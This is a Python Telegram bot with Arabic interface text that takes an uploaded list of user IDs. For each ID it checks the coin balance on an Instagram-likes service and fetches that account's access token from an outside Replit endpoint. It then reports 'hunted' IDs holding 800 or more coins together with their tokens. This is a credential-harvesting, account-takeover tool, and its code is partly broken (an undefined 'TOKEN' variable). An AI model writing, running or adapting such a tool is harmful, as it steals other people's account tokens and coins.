import telebot
import requests
from time import sleep
from telebot import types
Token = 'توكين'
bot = telebot.TeleBot(Token)

def get_likes(user_id):
    res = requests.get(f'http://instaup.marsapi.com/get_likes/shop/daily_coins?user_id={user_id}').json()
    coin = int(res['return']['coins'])
    sleep(1)
    return coin

def get_token(uid):
    res=requests.get(f'https://token.saraboot5880.repl.co/uid={uid}').json()
    if res['Status'] == 'Success':
        token=res['Token']
        return token
    else:
        return None

def create_buttons(checked_ids,valid_ids,invalid_ids,coins_below_800,total_ids):
    checked_button = types.InlineKeyboardButton(f"فحص : {checked_ids}",callback_data='jhi7')
    invalid_button = telebot.types.InlineKeyboardButton(text=f"خطاء :  {invalid_ids}", callback_data="none")
    coins_button = telebot.types.InlineKeyboardButton(text=f"نقاط قليلة :  {coins_below_800}", callback_data="none")
    count_button = telebot.types.InlineKeyboardButton(text=f"تم الصيد : {valid_ids + invalid_ids}", callback_data="none")
    count_total_button = telebot.types.InlineKeyboardButton(text=f"مجموع الايديات : {total_ids}", callback_data="none")
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(checked_button, invalid_button, coins_button, count_button, count_total_button)
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    welcome_text = "مرحباً بك! يرجى إرفاق ملف الأيديات وستظهر لك النتائج بعد الانتهاء."
    bot.send_message(chat_id, welcome_text)

@bot.message_handler(content_types=['document'])
def handle_document(message):
    chat_id = message.chat.id
    file_id = message.document.file_id
    file_info = bot.get_file(file_id)
    file = requests.get('https://api.telegram.org/file/bot{0}/{1}'.format(TOKEN, file_info.file_path))
    ids = file.text.strip().split("\n")
    total_ids = len(ids)
    checked_ids = 0
    valid_ids = 0
    invalid_ids = 0
    coins_below_800 = 0
    
    markup=create_buttons(checked_ids,valid_ids,invalid_ids,coins_below_800,total_ids)
    msg = bot.send_message(chat_id, "جاري الفحص...", reply_markup=markup)
    
    for user_id in ids:
        checked_ids += 1
        coins = get_likes(user_id)
        token = get_token(user_id)
        if coins < 800:
            coins_below_800 += 1
            continue
        elif token is not None:
            valid_ids += 1
            result_text = f"✅️Yes ID is Token✅️\n[🆔] ID : {user_id}\n[🟠]coins : {coins}\n[ℹ️]Token : {token}"
            bot.send_message(chat_id, result_text)
        else:
            invalid_ids += 1
            error_text = f""
            bot.send_message(chat_id, error_text)
            continue
        markup=create_buttons(checked_ids,valid_ids,invalid_ids,coins_below_800,total_ids)
        bot.edit_message_reply_markup(chat_id=chat_id, message_id=msg.message_id, reply_markup=markup)    
    markup=create_buttons(checked_ids,valid_ids,invalid_ids,coins_below_800,total_ids)
    bot.edit_message_reply_markup(chat_id=chat_id, message_id=msg.message_id, reply_markup=markup)
    
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    bot.answer_callback_query(call.id)

bot.polling()